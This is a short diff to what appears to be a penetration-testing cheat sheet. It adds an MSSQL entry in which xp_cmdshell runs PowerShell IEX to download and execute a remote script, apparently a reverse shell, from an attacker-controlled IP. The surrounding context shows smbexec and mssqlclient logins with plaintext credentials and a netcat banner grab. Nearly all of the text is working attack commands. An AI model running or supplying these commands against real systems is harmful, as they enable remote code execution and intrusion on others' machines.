@@ -80,10 +80,18 @@ cp zip /tmp
 python smbexec.py 'local_admin:P@ssw0rd123'@172.16.80.100
 python3 mssqlclient.py sa:EjectFrailtyThorn425@192.168.130.70 -p 1435
 ```
+# MSSQL
+```
+SQL> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.3:8000/rv.ps1\")
+```
+
+
+
 ##### Banner Grabbing
 ```
 nc -nv 192.168.64.54 24007
 ```
+
 
 # SQLi 
 ##### Oracle
